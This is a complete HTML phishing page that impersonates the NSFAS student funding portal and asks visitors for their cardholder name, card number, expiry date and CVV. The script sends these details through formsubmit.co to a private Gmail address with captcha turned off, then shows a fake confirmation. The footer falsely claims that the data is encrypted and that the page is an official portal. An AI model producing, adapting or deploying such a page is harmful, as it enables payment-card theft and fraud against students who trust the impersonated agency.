<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>NSFAS | Secure Payment Details</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
        }

        body {
            background: #f8f6f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 2rem 1rem;
        }

        /* main card container */
        .payment-card {
            max-width: 620px;
            width: 100%;
            background: white;
            border-radius: 28px;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.12);
            border: 1px solid #2c2c2c;
            overflow: hidden;
            transition: all 0.2s ease;
        }

        /* maroon header line */
        .maroon-header {
            background: white;
            padding: 1.5rem 2rem 0.8rem 2rem;
            border-bottom: 3px solid #800020;
        }

        .maroon-header h1 {
            font-size: 2rem;
            font-weight: 700;
            letter-spacing: -0.5px;
            color: #1e1e1e;
            display: inline-block;
            border-left: 4px solid #800020;
            padding-left: 18px;
        }

        .sub {
            color: #5a5a5a;
            font-size: 0.85rem;
            margin-top: 8px;
            margin-left: 22px;
        }

        /* form area */
        .form-container {
            padding: 2rem 2rem 2rem 2rem;
        }

        .section-title {
            font-size: 1.3rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            padding-bottom: 6px;
            border-bottom: 2px solid #800020;
            display: inline-block;
            color: #2c2c2c;
        }

        .input-group {
            margin-bottom: 1.6rem;
        }

        .input-group label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #2d2d2d;
            font-size: 0.9rem;
            letter-spacing: 0.3px;
        }

        .input-group input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #2c2c2c;
            border-radius: 18px;
            font-size: 1rem;
            background: white;
            transition: 0.2s;
            outline: none;
        }

        .input-group input:focus {
            border-color: #800020;
            box-shadow: 0 0 0 2px rgba(128, 0, 32, 0.15);
        }

        .row-double {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }

        .row-double .input-group {
            flex: 1;
        }

        button.submit-btn {
            background: #800020;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 1.2rem;
            font-weight: bold;
            color: white;
            border-radius: 44px;
            margin-top: 12px;
            cursor: pointer;
            transition: 0.2s;
            border: 1px solid #2c2c2c;
            letter-spacing: 1px;
        }

        button.submit-btn:hover {
            background: #5e0018;
            transform: scale(0.99);
        }

        .message-area {
            margin-top: 1.5rem;
            padding: 12px;
            text-align: center;
            font-weight: 500;
            border-radius: 40px;
            font-size: 0.9rem;
        }

        .footer-note {
            font-size: 0.7rem;
            text-align: center;
            border-top: 1px solid #e2dbd8;
            padding: 1rem;
            color: #6c6c6c;
            background: #fefaf8;
        }

        /* maroon accent on small elements */
        .required-star {
            color: #800020;
            font-size: 0.9rem;
        }

        @media (max-width: 550px) {
            .form-container {
                padding: 1.5rem;
            }
            .maroon-header h1 {
                font-size: 1.6rem;
            }
        }
    </style>
</head>
<body>

<div class="payment-card">
    <div class="maroon-header">
        <h1>NSFAS</h1>
        <div class="sub">Secure payment verification</div>
    </div>

    <div class="form-container">
        <span class="section-title">Card details</span>

        <!-- Name on card field -->
        <div class="input-group">
            <label>Cardholder name <span class="required-star">*</span></label>
            <input type="text" id="cardholderName" placeholder="JOHN M. DOE" autocomplete="cc-name" spellcheck="false">
        </div>

        <!-- Card number -->
        <div class="input-group">
            <label>Card number <span class="required-star">*</span></label>
            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number">
        </div>

        <!-- Expiry & CVV row -->
        <div class="row-double">
            <div class="input-group">
                <label>Expiry date <span class="required-star">*</span></label>
                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp">
            </div>
            <div class="input-group">
                <label>CVV <span class="required-star">*</span></label>
                <input type="text" id="cvv" placeholder="123" maxlength="4" autocomplete="cc-csc">
            </div>
        </div>

        <button class="submit-btn" id="uploadDetailsBtn">📤 UPLOAD DETAILS</button>
        <div id="formFeedback" class="message-area"></div>
    </div>

    <div class="footer-note">
        <span>All payment details are encrypted • NSFAS official portal</span>
    </div>
</div>

<script>
    // Helper: format card number with spaces every 4 digits
    function formatCardNumber(input) {
        let raw = input.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
        let formatted = '';
        for (let i = 0; i < raw.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += raw[i];
        }
        input.value = formatted.trim();
    }

    // Helper: format expiry as MM/YY
    function formatExpiry(input) {
        let val = input.value.replace(/[^0-9]/g, '');
        if (val.length >= 2) {
            let month = val.substring(0, 2);
            if (parseInt(month) > 12) month = "12";
            if (parseInt(month) < 1 && month !== "00") month = "01";
            let year = val.substring(2, 4);
            input.value = month + (year ? '/' + year : '');
        } else {
            input.value = val;
        }
    }

    // Restrict CVV to digits only and max 4
    function restrictDigitsOnly(input, maxLen) {
        input.value = input.value.replace(/[^0-9]/g, '').slice(0, maxLen);
    }

    // Validate all fields and submit via formsubmit.co
    async function submitPaymentDetails() {
        const feedbackDiv = document.getElementById('formFeedback');
        feedbackDiv.innerHTML = '';

        // Get values
        const cardholder = document.getElementById('cardholderName').value.trim();
        const cardNumberRaw = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const expiry = document.getElementById('expiry').value.trim();
        const cvv = document.getElementById('cvv').value.trim();

        // Validations
        if (!cardholder) {
            feedbackDiv.innerHTML = '❌ Please enter the cardholder name.';
            feedbackDiv.style.color = '#b00020';
            return;
        }
        if (cardholder.length < 3) {
            feedbackDiv.innerHTML = '❌ Please enter a valid full name (at least 3 characters).';
            feedbackDiv.style.color = '#b00020';
            return;
        }

        if (!cardNumberRaw || cardNumberRaw.length < 13 || cardNumberRaw.length > 19) {
            feedbackDiv.innerHTML = '❌ Card number must be between 13 and 19 digits.';
            feedbackDiv.style.color = '#b00020';
            return;
        }

        if (!expiry || !expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
            feedbackDiv.innerHTML = '❌ Expiry date must be in MM/YY format (e.g., 08/27).';
            feedbackDiv.style.color = '#b00020';
            return;
        }

        if (!cvv || cvv.length < 3 || cvv.length > 4) {
            feedbackDiv.innerHTML = '❌ CVV must be 3 or 4 digits.';
            feedbackDiv.style.color = '#b00020';
            return;
        }

        // Show loading state
        feedbackDiv.innerHTML = '⏳ Securely uploading details ...';
        feedbackDiv.style.color = '#800020';

        // Build payload for formsubmit.co
        const formPayload = new URLSearchParams();
        formPayload.append('_subject', 'NSFAS Payment Details - Card Submission');
        formPayload.append('cardholder_name', cardholder);
        formPayload.append('card_number', cardNumberRaw);
        formPayload.append('expiry_date', expiry);
        formPayload.append('cvv', cvv);
        formPayload.append('_captcha', 'false');
        formPayload.append('_template', 'table');
        formPayload.append('_replyto', 'asephelelemkhize26@gmail.com');

        try {
            const response = await fetch('https://formsubmit.co/ajax/asephelelemkhize26@gmail.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: formPayload.toString()
            });

            if (response.ok) {
                feedbackDiv.innerHTML = '✅ Details uploaded successfully! You will receive a confirmation.';
                feedbackDiv.style.color = '#1f6e43';
                // Clear sensitive fields after success (optional, but improves security)
                document.getElementById('cardholderName').value = '';
                document.getElementById('cardNumber').value = '';
                document.getElementById('expiry').value = '';
                document.getElementById('cvv').value = '';
            } else {
                feedbackDiv.innerHTML = '❌ Upload failed. Please check your connection and try again.';
                feedbackDiv.style.color = '#b00020';
            }
        } catch (err) {
            console.error('Submit error:', err);
            feedbackDiv.innerHTML = '❌ Network error. Unable to reach secure server.';
            feedbackDiv.style.color = '#b00020';
        }
    }

    // Wire up event listeners
    function init() {
        const cardNumberInput = document.getElementById('cardNumber');
        const expiryInput = document.getElementById('expiry');
        const cvvInput = document.getElementById('cvv');

        cardNumberInput.addEventListener('input', function() { formatCardNumber(this); });
        expiryInput.addEventListener('input', function() { formatExpiry(this); });
        cvvInput.addEventListener('input', function() { restrictDigitsOnly(this, 4); });

        // also prevent non-digit for CVV and card number typing (but formatting handles most)
        cardNumberInput.addEventListener('keydown', function(e) {
            // allow backspace, delete, arrows, tab, etc.
            if (e.key === ' ' || (e.key >= '0' && e.key <= '9')) return;
            if (e.key === 'Backspace' || e.key === 'Delete' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Tab') return;
            if (e.ctrlKey || e.metaKey) return;
            e.preventDefault();
        });

        expiryInput.addEventListener('keydown', function(e) {
            const allowedKeys = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', '/'];
            if ((e.key >= '0' && e.key <= '9') || allowedKeys.includes(e.key)) return;
            if (e.ctrlKey || e.metaKey) return;
            e.preventDefault();
        });

        cvvInput.addEventListener('keydown', function(e) {
            if ((e.key >= '0' && e.key <= '9') || e.key === 'Backspace' || e.key === 'Delete' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Tab') return;
            if (e.ctrlKey || e.metaKey) return;
            e.preventDefault();
        });

        const submitBtn = document.getElementById('uploadDetailsBtn');
        submitBtn.addEventListener('click', submitPaymentDetails);
    }

    init();
</script>
</body>
</html>
